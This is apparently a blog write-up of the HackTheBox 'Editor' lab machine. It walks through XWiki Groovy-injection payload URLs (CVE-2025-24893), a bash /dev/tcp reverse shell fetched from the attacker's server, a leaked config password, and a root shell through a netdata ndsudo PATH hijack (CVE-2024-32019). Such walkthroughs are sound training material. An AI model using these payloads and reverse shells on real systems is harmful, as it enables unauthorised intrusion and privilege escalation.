---
title: "Editor HackTheBox Writeup"
date: 2025-08-31
tags: [ssh, HackTheBox, ndsudo, web-exploitation, privilege-escalation]
categories: [HackTheBox]
description: "Complete walkthrough of the Editor machine from HackTheBox, covering web exploitation and privilege escalation techniques."
---

# HackTheBox - Editor

> **Note**: This writeup contains image placeholders. To see the actual screenshots, add your real HackTheBox images to `static/images/hackthebox/Editor/` and update the image paths below.

## Machine Information
- **Name**: Editor
- **Difficulty**: Medium
- **OS**: Linux
- **IP**: 10.10.11.80
- **Points**: 30

---

## Reconnaissance

### Initial Port Scan

We start with a comprehensive Nmap scan:

```bash
nmap -sC -sV --min-rate 5000 -T5 -Pn -p- 10.10.11.80
```

**Scan Results:**
- `22/tcp` open ssh OpenSSH
- `80/tcp` open http nginx
- `8080/tcp` open http Jetty

### Host File Configuration

Add the target to your hosts file:

```bash
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Port 80 - Nginx

**Image Placeholder**: Port 80 Web Enumeration Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/port80-enum.png`*

### Port 8080 - Jetty/XWiki

**Image Placeholder**: Port 8080 Web Enumeration Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/port8080-enum.png`*

During enumeration, I discovered the XWiki version at the bottom of the page. Researching this led to **CVE-2025-24893**.

**Image Placeholder**: CVE Information Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/cve-info.png`*

---

## Exploitation

### CVE-2025-24893 Exploit

I found the exploit at: [https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py)

### Reverse Shell Setup

1. **Create shell.sh**:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1
```

2. **Start Python HTTP server**:
```bash
python3 -m http.server 8000
```

3. **Encoded payload URL**:
```
http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("wget%20-qO%20/tmp/shell.sh%20http://10.10.14.205:8000/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

4. **Start listener**:
```bash
rlwrap nc -lvnp 9001
```

5. **Execute payload**:
```
http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22bash%20/tmp/shell.sh%22.execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

**Image Placeholder**: Shell Access Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/shell-access.png`*

---

## User Access

### User Discovery

In `/etc/passwd`, we find user **oliver**:
```
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

### Password Extraction

In the **WEB-INF** directory, we find `hibernate.cfg.xml` containing Oliver's password:

```
theEd1t0rTeam99
```

**Image Placeholder**: Hibernate Configuration Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/hibernate-config.png`*

### SSH Access

```bash
ssh oliver@editor.htb
```

**Result**: User flag obtained!

---

## Privilege Escalation

### Netdata Service Discovery

On localhost port 19999, there's a **netdata** service running:

**Image Placeholder**: Netdata Service Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/netdata-service.png`*

### Port Forwarding

Set up SSH port forwarding:

```bash
ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
```

Access in browser:
```
http://localhost:19999/
```

**Image Placeholder**: Port Forwarding Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/port-forwarding.png`*

### Version Information

Clicking "Please update them" reveals version **1.45.2**:

**Image Placeholder**: Version Information Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/version-info.png`*

### CVE-2024-32019 Exploitation

Research led to **CVE-2024-32019**. Oliver has permission to run `ndsudo`:

1. Place an executable with a name from `ndsudo`'s command list (e.g., `nvme`) in a writable path
2. Set the `PATH` environment variable to include this path
3. Run `ndsudo` with a command that executes the aforementioned executable

### Exploit Creation

1. **Create exploit.c**:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);       // Switch to root
    setgid(0);       // Switch group to root
    system("/bin/bash");  // Spawn a root shell
    return 0;
}
```

2. **Compile**:
```bash
gcc -o nvme exploit.c
```

3. **Upload and Execute**:
```bash
# Start Python server
python3 -m http.server 8000

# Download exploit
curl http://<YOUR-IP>:8000/nvme -o nvme
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**Result**: Root access obtained!

**Image Placeholder**: Root Flag Screenshot
*Add your screenshot here: `static/images/hackthebox/Editor/root-flag.png`*

---

## Summary

This machine involved:
1. **Web exploitation** via CVE-2025-24893 (XWiki)
2. **Password extraction** from configuration files
3. **Privilege escalation** via CVE-2024-32019 (netdata)

---

## Image Setup Instructions

To add your actual HackTheBox screenshots:

1. **Create directory**: `mkdir -p static/images/hackthebox/Editor/`
2. **Add images** with these names:
   - `port80-enum.png` - Port 80 enumeration
   - `port8080-enum.png` - Port 8080 enumeration
   - `cve-info.png` - CVE information
   - `shell-access.png` - Shell access
   - `hibernate-config.png` - Hibernate configuration
   - `netdata-service.png` - Netdata service
   - `port-forwarding.png` - Port forwarding
   - `version-info.png` - Version information
   - `root-flag.png` - Root flag
3. **Update image paths** in this post to use:
   ```markdown
   ![Description](/images/hackthebox/Editor/filename.png)
   ```
4. **Recommended size**: 800x600 pixels for screenshots
